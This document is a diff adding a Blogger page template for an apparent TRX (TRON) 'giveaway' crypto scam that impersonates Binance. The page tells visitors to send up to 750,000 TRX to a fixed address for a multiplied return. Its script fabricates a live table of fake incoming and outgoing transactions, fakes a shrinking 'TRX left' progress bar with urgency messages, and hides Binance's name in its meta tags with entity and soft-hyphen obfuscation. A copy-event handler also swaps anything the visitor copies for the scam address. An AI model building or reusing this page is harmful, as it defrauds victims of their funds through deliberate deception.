@@ -1,0 +1,554 @@
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/254310735-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
+<meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/>
+<title>TRX</title>
+<link href='/favicon.ico' rel='shortcut icon'/>
+<style id='page-skin-1' type='text/css'><!--
+.last_trans{width:100%;background-color:#fff;padding:15px;margin:50px auto 0;box-shadow:0 0 10px 0 rgba(0,0,0,0.5)}
+h1.f-24.mvn.em-300{font-family:Montserrat,Helvetica,sans-serif;color:#5f5f5f;font-size:23px;font-weight:300;margin-bottom:15px}
+h1.f-24.mvn.em-300 span{font-family:"Montserrat","Helvetica",sans-serif;font-size:16px;font-style:italic;color:#a8a8a8;font-weight:300;white-space:nowrap}
+.text-overflow-hidden{overflow:visible!important}
+#lympo_progress .progress{max-width:460px;margin:10px auto;height:45px;border-radius:5px;position:relative;margin-bottom:20px;background-color:#3b3b43;border-radius:4px;-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,0.1);box-shadow:inset 0 1px 2px rgba(0,0,0,0.1)}
+#lympo_progress .progress:before{content:"";display:block;background:#000;width:100%;height:100%}
+#lympo_progress .progress-row{max-width:600px;margin:0 auto}
+#lympo_progress .progress-row > div{padding:0 5px}
+#lympo_progress .progress-bar{-webkit-transition:width 1.4s ease;transition:width 1.4s ease;float:left;width:0;height:100%;border-bottom-left-radius:4px;border-top-left-radius:4px;font-size:13px;line-height:20px;color:#fff;text-align:center;background-color:#ee1d4e;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,0.15);box-shadow:inset 0 -1px 0 rgba(0,0,0,0.15);-webkit-transition:width .6s ease;transition:width .6s ease;position:absolute;top:0}
+#lympo_progress .progress-bar-striped{background-image:linear-gradient(135deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);background-size:40px 40px}
+#lympo_progress .progress-bar.active{-webkit-animation:progress-bar-stripes 2s linear infinite;animation:progress-bar-stripes 2s linear infinite}
+@keyframes progress-bar-stripes {
+from{background-position:-40px 0}
+to{background-position:0 0}
+}
+#lympo_progress .progress-ico{position:relative;max-width:460px;margin:48px auto -3px}
+#lympo_progress .progress-ico .dot-1{position:absolute;bottom:100%;font-size:12px;width:100%;margin-left:0;z-index:100;padding:8px;color:#fff;width:100%;text-align:center;padding-bottom:12px;font-weight:700;font-size:16px;text-shadow:1px 1px 5px #000}
+#lympo_progress .progress-ico .dot-1-airdrop:before{content:"";display:block;width:10px;height:10px;background-color:#f04154;border-radius:50%;margin:0;position:absolute;right:-4px;top:-7px}
+#lympo_progress .progress-ico .dot-1-airdrop{content:"";display:block;height:60px;background-color:#f04154;width:2px;position:absolute;right:-1px;z-index:100;top:-4px;left:100%}
+#lympo_progress .progress-ico .progress{position:relative;margin:0 auto}
+#lympo_progress .progress-ico span{position:absolute;text-align:center;top:0;left:0;right:0;line-height:45px;color:#fff;font-size:14px;letter-spacing:.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;box-shadow:0 0 10px 0 rgba(0,0,0,0.5)}
+@media (max-width: 767px) {
+#lympo_progress .progress-ico span{font-size:15px}
+}
+.label-orange{background:#e67e22}
+.tooltip{position:relative;display:inline-block}
+.toolbar{-webkit-animation-name:animation;-webkit-animation-duration:1s;-webkit-animation-timing-function:ease-in-out;-webkit-animation-play-state:running;animation-name:animation;animation-duration:1s;animation-timing-function:ease-in-out;animation-play-state:running}
+@-webkit-keyframes animation {
+0%{background-color:#ede86c}
+100.0%{background-color:#fff}
+}
+@keyframes animation {
+0%{background-color:#ede86c}
+100.0%{background-color:#fff}
+}
+.payment-request{padding-top:120px;max-width:100%;box-shadow:0 0 10px 0 rgba(0,0,0,0.5)}
+@media (max-width: 767px),(max-height: 700px) {
+.payment-request .ph-40{padding-left:7px;padding-right:7px}
+}
+.request{padding-top:2em}
+#waiting{margin-bottom:1.5em}
+#waiting p{font-size:11px}
+.text-center{text-align:center;background:#000;color:#cbf200;padding:5px;border-top:1px solid #ffcf00;box-shadow:0 0 10px 0 rgba(0,0,0,0.5);border-bottom:1px solid #ffcf00}
+html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
+body{margin:0}
+a{background-color:transparent}
+a:active,a:hover{outline:0}
+b{font-weight:700}
+h1{font-size:2em;margin:.67em 0}
+img{border:0}
+button{color:inherit;font:inherit;margin:0;overflow:visible;text-transform:none;-webkit-appearance:button;cursor:pointer}
+button::-moz-focus-inner{border:0;padding:0}
+table{border-collapse:collapse;border-spacing:0}
+td,th{padding:0}
+*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
+:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
+html{font-size:10px;-webkit-tap-highlight-color:transparent}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.42857;color:#333;background-color:#fff}
+button{font-family:inherit;font-size:inherit;line-height:inherit}
+a{color:#337ab7;text-decoration:none}
+a:hover,a:focus{color:#23527c;text-decoration:underline}
+a:focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}
+img{vertical-align:middle}
+.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}
+h1{font-family:inherit;font-weight:500;line-height:1.1;color:inherit}
+h1{margin-top:20px;margin-bottom:10px}
+h1{font-size:36px}
+p{margin:5px 0}
+table{background-color:transparent}
+th{text-align:left}
+.table{width:100%;max-width:100%;font-size:small;margin-bottom:20px}
+.table > tbody > tr > th,.table > tbody > tr > td{padding:8px;line-height:1.42857;vertical-align:top;border-top:1px solid #ddd}
+.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:14px;line-height:1.42857;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+.btn:focus,.btn:active:focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}
+.btn:hover,.btn:focus{color:#333;text-decoration:none}
+.btn:active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}
+.btn-primary{color:#fff;background-color:#337ab7;border-color:#2e6da4}
+.btn-primary:focus{color:#fff;background-color:#286090;border-color:#122b40}
+.btn-primary:hover{color:#fff;background-color:#286090;border-color:#204d74}
+.btn-primary:active{color:#fff;background-color:#286090;border-color:#204d74}
+.btn-primary:active:hover,.btn-primary:active:focus{color:#fff;background-color:#204d74;border-color:#122b40}
+.btn-primary:active{background-image:none}
+.fade{opacity:0;-webkit-transition:opacity .15s linear;-o-transition:opacity .15s linear;transition:opacity .15s linear}
+.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}
+.label-success{background-color:#5cb85c}
+@-webkit-keyframes progress-bar-stripes {
+from{background-position:40px 0}
+to{background-position:0 0}
+}
+@keyframes progress-bar-stripes {
+from{background-position:40px 0}
+to{background-position:0 0}
+}
+.progress{overflow:hidden;height:20px;margin-bottom:20px;background-color:#f5f5f5;border-radius:4px;-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,0.1);box-shadow:inset 0 1px 2px rgba(0,0,0,0.1)}
+.progress-bar{float:left;width:0;height:100%;font-size:12px;line-height:20px;color:#fff;text-align:center;background-color:#337ab7;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,0.15);box-shadow:inset 0 -1px 0 rgba(0,0,0,0.15);-webkit-transition:width .6s ease;-o-transition:width .6s ease;transition:width .6s ease}
+.progress-bar-striped{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);background-size:40px 40px}
+.progress-bar.active{-webkit-animation:progress-bar-stripes 2s linear infinite;-o-animation:progress-bar-stripes 2s linear infinite;animation:progress-bar-stripes 2s linear infinite}
+.tooltip{position:absolute;z-index:1070;display:block;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-style:normal;font-weight:400;letter-spacing:normal;line-break:auto;line-height:1.42857;text-align:left;text-align:start;text-decoration:none;text-shadow:none;text-transform:none;white-space:normal;word-break:normal;word-spacing:normal;word-wrap:normal;font-size:12px;opacity:0;filter:alpha(opacity=0)}
+.tooltip.bottom{margin-top:3px;padding:5px 0}
+.tooltip-inner{max-width:200px;padding:3px 8px;color:#fff;text-align:center;background-color:#000;border-radius:4px}
+.tooltip-arrow{position:absolute;width:0;height:0;border-color:transparent;border-style:solid}
+.tooltip.bottom .tooltip-arrow{top:0;left:50%;margin-left:-5px;border-width:0 5px 5px;border-bottom-color:#000}
+@media (min-width: 768px) and (max-width: 991px) {
+.hidden-sm{display:none!important}
+}
+.pos-rel{position:relative}
+.bg-grey{background:#fff;box-shadow:0 0 10px 0 rgba(0,0,0,0.5);border-top:1px solid #25a9e6;border-bottom:1px solid #25a9e6}
+.bg-blue{background:#004a7c url("https://i.imgur.com/6J0FMiT.jpg");background-attachment:fixed;background-size:cover}
+.bg-white{background:#fff}
+.flex-center,.flex-justify{display:-webkit-box;display:-ms-flexbox;display:-webkit-flex;display:flex}
+.flex-center{-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}
+.flex-justify{-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}
+.mvn{margin-top:0;margin-bottom:0}
+.ph-25{padding-left:10px;padding-right:10px}
+.ph-40{padding-left:40px;padding-right:40px}
+.pv-10{padding-top:15px;padding-bottom:15px}
+.mt-15{margin-top:15px}
+.mb-25{margin-bottom:15px}
+.mb-26{margin-bottom:25px}
+.f-24{font-size:24px}
+.f-16{font-size:16px}
+.main-font{font-family:"Montserrat","Helvetica",sans-serif!important}
+.center{text-align:center}
+.text-overflow-hidden{text-overflow:ellipsis;overflow:hidden;white-space:nowrap;width:calc(100% - 10px);font-weight:300;display:block}
+.em-300{font-weight:300}
+.em-300:before{font-weight:300!important}
+.btn:focus{color:#fff}
+a{outline:0;cursor:pointer;color:#10ADE4}
+a:hover,a:visited{text-decoration:none}
+a:hover{color:#10ADE4;cursor:pointer}
+a:focus{outline:0}
+button:focus{outline:none!important}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;min-height:100vh;display:flex;display:-moz-box-flex;display:-ms-flexbox;display:-webkit-box;display:-webkit-flex;flex-direction:column;-ms-flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal;line-height:1.428571429;background-color:#fff;font-size:14px;color:#5f5f5f}
+.progress-row{max-width:600px;margin:0 auto}
+#payment-button-wrap{position:relative;display:inline-block}
+#payment-button{margin-bottom:15px;color:#fff;background-color:#337ab7;border-color:#2e6da4;display:inline-block;font-weight:400;text-align:center;vertical-align:middle;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:14px;line-height:1.42857;border-radius:4px;box-shadow:0 0 10px 0 rgba(0,0,0,0.5)}
+#payment-button:hover,#payment-button:active{color:#fff;background-color:#286090;border-color:#204d74;text-decoration:none}
+#payment-button:active{background-image:none;box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}
+#payment-tooltip{left:0;right:0;top:calc(100% - 10px);text-align:center;display:block;position:absolute;z-index:1000;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-style:normal;font-weight:400;letter-spacing:normal;line-height:1.42857;text-decoration:none;text-shadow:none;text-transform:none;white-space:normal;word-break:normal;word-spacing:normal;word-wrap:normal;font-size:12px;opacity:0;transition:opacity .15s linear}
+#tooltip-arrow{top:-5px;left:50%;margin-left:-5px;border-width:0 5px 5px;border-color:transparent;border-bottom-color:#000;position:absolute;width:0;height:0;border-style:solid}
+#tooltip-inner{display:inline-block;max-width:200px;padding:3px 8px;color:#fff;text-align:center;background-color:#000;border-radius:4px}
+h3.post-title,.post-footer,#comments,#blog-pager,.blog-feeds{display:none}
+#particles-js{position:absolute;top:0;left:0;right:0;bottom:0;z-index:0}
+.payment-request,.progress-bar-value,.last_trans{z-index:1}
+@media only screen and (max-width:1024px){
+#myTable tr td:first-child,#myTable tr th:first-child,#myTable tr td:nth-child(2),#myTable tr th:nth-child(2){display:none}
+.request{padding-top:0 !important}
+}
+@media only screen and (min-width:1080px){
+.last_trans{width:1050px}
+}
+
+--></style>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js'></script>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=9076972975464369317&amp;zx=b49dc88a-cd18-4d81-91a9-0c046746d96a' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=9076972975464369317&amp;zx=b49dc88a-cd18-4d81-91a9-0c046746d96a' rel='stylesheet'/></noscript>
+
+</head>
+<body class='bg-blue opaque-nav main-font request'>
+<div class='main section' id='main'><div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+
+          <div class="date-outer">
+        
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='https://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=TVyFiVhjShJ2iwgyxiKF9A6AZXzBhErRRw&chld=H|0' itemprop='image_url'/>
+<meta content='9076972975464369317' itemprop='blogId'/>
+<meta content='23066881030421623' itemprop='postId'/>
+<a name='23066881030421623'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+TRX
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-23066881030421623' itemprop='description articleBody'>
+
+<meta content='summary_large_image' name='twitter:card'/>
+<meta content='&#66;i&#173;n&#173;&#97;&#173;n&#173;&#99;&#101;&#39;&#173;&#115; J&#173;&#97;n&#173;u&#173;&#97;&#173;ry Giv&#173;&#101;&#173;&#97;&#173;w&#97;&#173;y!' name='twitter:title'/>
+<meta content='&#67;l&#173;i&#173;&#99;&#173;k h&#173;&#101;&#173;r&#173;&#101; t&#111; g&#173;&#101;&#173;t y&#173;&#111;&#173;u&#173;r&#173;&#115; N&#79;&#173;W! T&#111; v&#173;&#101;&#173;r&#173;i&#173;f&#173;y y&#173;&#111;&#173;u&#173;r &#97;&#173;d&#173;d&#173;r&#101;&#115;&#173;&#115;, ju&#115;&#173;t &#115;&#173;&#101;n&#173;d 2&#173;0&#173;0&#173;0&#173;-40&#173;00&#173;0 T&#173;R&#173;X &#97;&#173;nd 4&#173;0&#173;00-&#173;8000&#173;0 T&#173;RX (x&#173;2&#173;) w&#173;ill &#98;&#173;&#101; imm&#101;&#173;d&#173;i&#173;&#97;&#173;t&#101;l&#173;y &#115;&#173;&#101;&#173;nt &#98;&#97;&#173;&#99;k t&#173;&#111; y&#173;&#111;u!' name='twitter:description'/>
+<meta content='https://1.bp.blogspot.com/-MN0mz5tmVc4/XDyR23fH0kI/AAAAAAAABIo/WP2uwTfQ4N4sXz5uJvYjAbkzFqvLhFa9ACLcBGAs/s1600/TRX.jpg' name='twitter:image'/>
+<script>
+window.ADDRESS="TVyFiVhjShJ2iwgyxiKF9A6AZXzBhErRRw";
+</script>
+ <div class="overflow-scroll flex-justify flex-center main-font">
+  <div class="bg-white payment-request pos-rel">
+   <div class="pv-45 ph-40 center">
+    <div class="detail" style="margin-top:-100px">
+     <p class="text-center f-16 em-300 mt-15 mb-25" style="font-size:18pt;">300 000 000 TRX Giveaway!</p>
+     <p class="text-center f-16 em-300 mt-15 mb-25" style="font-size:13pt;">To verify your address you just need to send between 1 000 TRX to 750 000 TRX to the contribution address and we will immediately send you back between 75 000 TRX  to 7 500 000 TRX to the address you sent it from.</p>
+     <h1 class="f-24 mvn em-300">Payment Address</h1>
+     <p class="f-16 em-300 mt-15 mb-25">You can send TRX to the following address:</p>
+     <div id="div-target" class="f-16 bg-grey ph-25 pv-10 text-overflow-hidden mb-25"><span id="address">TVyFiVhjShJ2iwgyxiKF9A6AZXzBhErRRw</span></div>
+     <div id="payment-button-wrap">
+      <button id="payment-button" data-original-title="Copied!" data-clipboard-text="TVyFiVhjShJ2iwgyxiKF9A6AZXzBhErRRw">Copy Address to Clipboard</button>
+      <div id="payment-tooltip"><div id="tooltip-arrow"></div><div id="tooltip-inner">Copied!</div></div>
+     </div>
+     <div id="qr-code" class="mb-25 flex-justify"><img height="150" src="https://chart.apis.google.com/chart?cht=qr&amp;chs=150x150&amp;chl=TVyFiVhjShJ2iwgyxiKF9A6AZXzBhErRRw&amp;chld=H|0" width="150" /></div>
+     <p class="f-16 em-300 mt-15 mb-25">Waiting for your payment</p>
+     <img src="https://i.imgur.com/RbBM28Q.gif" style="margin-top:-15px" width="30px" />
+     <div id="waiting">
+      <p class="f-16 em-300 mb-25" onclick="wait()">Still waiting for transaction? Click HERE</p>
+      <p class="f-16 em-300 mt-15 mb-25">Once we receive your transaction, the outgoing transaction is processed to your address.</p>
+      <p class="f-16 em-300 mt-15 mb-25">Every address that is sent too late, gets their TRX immediately sent back.</p>
+     </div>
+    </div>
+   </div>
+  </div>
+ </div>
+ <div id="lympo_progress">
+  <div class="row progress-row">
+   <div class="colums_12">
+    <div class="progress-ico">
+     <div class="progress">
+      <div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width:45.2%;">
+       <span class="sr-only">x</span>
+      </div>
+     </div>
+     <div class="dot-1" id="leftcoin">Left TRON</div>
+     <div class="dot-1-airdrop progress-left" style="left:45.2%;"></div>
+     <span class="progress-bar-value" id="progress-ico-bar">3616000 / 300000000</span>
+    </div>
+   </div>
+  </div>
+ </div>
+ <div class="last_trans">
+  <h1 class="f-24 mvn em-300">Transactions for address: <span id="trnsctaddr">TVyFiVhjShJ2iwgyxiKF9A6AZXzBhErRRw</span></h1>
+  <table class="table" id="myTable">
+   <tbody>
+    <tr>
+     <th>TxHash</th>
+     <th><span title="UTC time">Age</span></th>
+     <th>From</th>
+     <th></th>
+     <th>To</th>
+     <th>Quantity</th>
+    </tr>
+   </tbody>
+  </table>
+ </div>
+
+<script type="text/javascript">
+//<![CDATA[
+function wait(){
+ waiting.innerHTML="Sometimes transactions are not sent properly. Try sending it again. Remember, every transaction address we receive gets their TRX back + giveaway prize.";
+ waiting.style.color="green";
+}
+
+function txid_gen(){
+ var tx;
+ tx = "xxxxxxxxxxxxxxxxx".replace(/[xy]/g, function(t){
+   var e = 16 * Math.random() | 0;
+   return ("x" == t ? e : 3 & e | 8).toString(16);
+  });
+  tx = tx.toLowerCase();
+ return tx;
+}
+
+function addr_gen(){
+ var addr;
+ var s = new Array("1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","J","K","L","M","N","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z"),
+  num;
+ addr="T";
+ num = Math.random();
+ 
+ for(var i = 0; i < 16; i++){
+  do{
+   num = parseInt(Math.random() * 100);
+   if(num <= 57) break;
+  } while(true);
+  addr += s[num];
+ }
+ return addr;
+}
+
+function starttr(){
+ var OUT, TXID, TXID2, INCIN, INOUT, CTIME, t;
+ for(i=0; i < 8; i++){
+  OUT = addr_gen();
+  TXID = txid_gen();
+  TXID2 = txid_gen();
+  INCIN = (Math.random() * (20000 - 2000) + 2000).toFixed(0) * 1;
+  INOUT = (2 * INCIN).toFixed(0) * 1;
+  
+  if(INCIN >= 1000) INCIN=INCIN.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+  if(INOUT >= 1000) INOUT=INOUT.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+  
+  CTIME = 7 - i;
+  if(CTIME<1) CTIME="now";
+  else CTIME = CTIME + " mins ago";
+  
+  t = document.getElementById("myTable").insertRow(1);
+  t.innerHTML = '<td><a class="toolme address-tag" href="#">' + TXID + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">' + CTIME + '</span></td><td><a class="address-tag" href="#">' + OUT + '...</a></td><td><span class="label label-success rounded">&#160; IN &#160;</span></td><td><span class="address-tag">TPcDNYz4AxCaLCY2X...</span></td><td>' + INCIN + ' TRX</td>';
+  document.getElementsByTagName('tr')[1].classList.add('toolbar');
+  
+        t = document.getElementById('myTable').insertRow(1);
+        t.innerHTML = '<td><a class="address-tag" href="#">' + TXID2 + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">' + CTIME + '</span></td><td><a class="address-tag" href="#">TPcDNYz4AxCaLCY2X...</a></td><td><span class="label label-orange rounded" style="background:#e67e22;">OUT</span></td><td><span class="address-tag">' + OUT + '...</span></td><td>' + INOUT + ' TRX</td>';
+  document.getElementsByTagName('tr')[1].classList.add('toolbar');
+ }
+}
+
+function newtr(){
+    var OUT = addr_gen(),
+  TXID = txid_gen(),
+  TXID2 = txid_gen(),
+  INCIN = (Math.random() * (20000 - 2000) + 2000).toFixed(0) * 1,
+  INOUT = (2 * INCIN).toFixed(0) * 1,
+  VINCIN, VINOUT, TXCOUNT,
+  t, table=document.getElementById('myTable');
+ 
+ if(INCIN >= 1000) VINCIN=INCIN.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+ else VINCIN=INCIN;
+ if(INOUT >= 1000) VINOUT=INOUT.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+ else VINOUT=INOUT;
+ 
+    t = table.insertRow(1);
+    t.innerHTML = '<td><a class="toolme address-tag" href="#">' + TXID + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">now</span></td><td><a class="address-tag" href="#">' + OUT + '...</a></td><td><span class="label label-success rounded">&#160; IN &#160;</span></td><td><span class="address-tag">TPcDNYz4AxCaLCY2X...</span></td><td>' + VINCIN + ' TRX</td>';
+ document.getElementsByTagName('tr')[1].classList.add('toolbar');
+ table.deleteRow(table.rows.length - 1);
+ setTimeout(function(){
+        t = table.insertRow(1);
+        t.innerHTML = '<td><a class="address-tag" href="#">' + TXID2 + '...</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" class="tim3">now</span></td><td><a class="address-tag" href="#">TPcDNYz4AxCaLCY2X...</a></td><td><span class="label label-orange rounded" style="background:#e67e22;">OUT</span></td><td><span class="address-tag">' + OUT + '...</span></td><td>' + VINOUT + ' TRX</td>';
+  document.getElementsByTagName('tr')[1].classList.add('toolbar');
+  table.deleteRow(table.rows.length - 1);
+  
+  TXCOUNT=(INOUT-INCIN).toFixed(0) * 1;
+  updateProgress(TXCOUNT);
+    }, 2000);
+}
+
+function updateTrans(){
+    for(i=0; i < times.length; i++) "now" == times[i].innerHTML.split(" ")[0] ? times[i].innerHTML = "1 mins ago" : times[i].innerHTML = parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " mins ago";
+    newtr();
+}
+
+var times = document.getElementsByClassName("tim3");
+window.onload = function(){
+ starttr();
+    updateTrans();
+ trans = setInterval(function(){
+        updateTrans();
+    }, 30000);
+};
+
+
+function setProgress(count, max){
+    var p = (100*count/max).toString() + "%";
+    $(".progress-left").css("left", p);
+    $(".progress-width").css("width", p);
+    var cc = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, "$1 ");
+    var mm = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, "$1 ");
+    $(".progress-bar-value").text(cc + " / " + mm);
+}
+
+var stop_progress=false;
+function updateProgress(TXCOUNT){
+ if(stop_progress) return;
+ 
+    if(localStorage.getItem("barTRX")){
+  if(localStorage.getItem("barTRX") <= 200000){
+   var new_count=localStorage.getItem("barTRX");
+  } else if(localStorage.getItem("barTRX")) {
+   var init_count=localStorage.getItem("barTRX");
+   var new_count=(init_count - TXCOUNT).toFixed(0) * 1;
+        }
+ } else {
+        var init_count=3616000;
+  var new_count=(init_count - TXCOUNT).toFixed(0) * 1;
+    }
+    setProgress(new_count, 300000000);
+ 
+ localStorage.setItem("barTRX", new_count);
+ 
+ if(init_count <= 280000) stop_progress=true;
+ if(new_count <= 8000000 && init_count >= 1600001){
+  document.getElementById("leftcoin").innerHTML="Left TRON";
+  document.title=new_count+" TRX left";
+ }
+ if(new_count <= 1600000 && init_count >= 280001) document.getElementById("leftcoin").innerHTML="Hurry up, not much more TRX left!";   
+ if(new_count <= 280000) document.getElementById("leftcoin").innerHTML="Last chance to get your TRX!";
+ if(new_count <= 1600000) document.title="Get your "+new_count+" TRX now!";
+}
+//]]>
+</script>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+</span>
+<span class='post-timestamp'>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+</span>
+<span class='post-backlinks post-comment-link'>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-429662554'>
+<a href='https://www.blogger.com/page-edit.g?blogID=9076972975464369317&pageID=23066881030421623&from=pencil' title='Edit Page'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=9076972975464369317&pageID=23066881030421623&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=9076972975464369317&pageID=23066881030421623&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=9076972975464369317&pageID=23066881030421623&target=twitter' target='_blank' title='Share to Twitter'><span class='share-button-link-text'>Share to Twitter</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=9076972975464369317&pageID=23066881030421623&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=9076972975464369317&pageID=23066881030421623&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+<div class='comments' id='comments'>
+<a name='comments'></a>
+<h4>No comments:</h4>
+<div id='Blog1_comments-block-wrapper'>
+<dl class='avatar-comment-indent' id='comments-block'>
+</dl>
+</div>
+<p class='comment-footer'>
+<div class='comment-form'>
+<a name='comment-form'></a>
+<h4 id='comment-post-message'>Post a Comment</h4>
+<p>
+</p>
+<a href='https://www.blogger.com/comment-iframe.g?blogID=9076972975464369317&pageID=23066881030421623' id='comment-editor-src'></a>
+<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410px' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
+<script src='https://www.blogger.com/static/v1/jsbin/55386745-comment_from_post_iframe.js' type='text/javascript'></script>
+<script type='text/javascript'>
+      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
+    </script>
+</div>
+</p>
+<div id='backlinks-container'>
+<div id='Blog1_backlinks-container'>
+</div>
+</div>
+</div>
+</div>
+
+        </div></div>
+      
+</div>
+<div class='blog-pager' id='blog-pager'>
+<a class='home-link' href='https://janbinance.blogspot.com/'>Home</a>
+</div>
+<div class='clear'></div>
+<div class='blog-feeds'>
+<div class='feed-links'>
+Subscribe to:
+<a class='feed-link' href='https://janbinance.blogspot.com/feeds/posts/default' target='_blank' type='application/atom+xml'>Posts (Atom)</a>
+</div>
+</div>
+</div></div>
+<script type='text/javascript'>
+	//<![CDATA[
+	var exec_copy=false;
+	function copyAddress(isCopy=false){
+		if(exec_copy) return;
+		else exec_copy=true;
+		
+		var t = window.getSelection(),
+			e = document.createElement('div');
+		e.style.position='absolute';
+		e.style.left='-99999px';
+		document.body.appendChild(e);
+		e.innerHTML=window.ADDRESS;
+		t.selectAllChildren(e);
+		if(isCopy) document.execCommand('copy');
+		window.setTimeout(function(){
+			document.body.removeChild(e);
+		}, 100);
+		
+		exec_copy=false;
+	}
+	document.addEventListener('copy', copyAddress);
+	
+	//
+	function selectText(elementId){
+		var text=document.getElementById(elementId), range, selection;
+		
+		if(document.body.createTextRange){
+			range=document.body.createTextRange();
+			range.moveToElementText(text);
